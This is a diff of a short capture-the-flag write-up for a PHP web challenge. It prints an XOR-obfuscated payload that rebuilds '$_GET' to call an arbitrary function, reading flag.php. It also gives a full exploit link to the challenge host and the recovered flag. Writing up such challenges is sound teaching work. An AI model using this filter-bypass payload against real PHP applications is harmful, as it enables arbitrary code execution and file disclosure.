@@ -1,14 +1,12 @@
 **Challenge:** http://69.90.132.196:5003/?view-source
 
-Reference: https://ctf-wiki.github.io/ctf-wiki/web/php/php/
+Payload: <code>$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=highlight_file&__=flag.php</code>
 
-Payload: `$_="``{{{"^"?<>/";${$_}[_](${$_}[__]);&_=highlight_file&__=flag.php`
+Explaining:
+  - <code>$_="`{{{"^"?<>/";</code> | Result of xor operation: $_ = "_GET"
+  - <code>${$_}[_](${$_}[__]);</code> | $_GET[_]($_GET[__])
+  - Eval function will be: <code>eval(highlight_file('flag.php'))</code>
 
-Explaning:
-  - $_="`{{{"^"?<>/"; | Result of xor operation: $_ = "_GET"
-  - ${$_}[_](${$_}[__]); | $_GET[_]($_GET[__])
-  - Eval function will be: eval(highlight_file('flag.php'))
-
-[Get the flag](http://69.90.132.196:5003/?view-source)
+**<a href="http://69.90.132.196:5003/?warmup=$_=%22`{{{%22^%22?%3C%3E/%22;${$_}[_](${$_}[__]);&_=highlight_file&__=flag.php" >Get the flag</a>**
 
 **Flag**: ASIS{w4rm_up_y0ur_br4in}
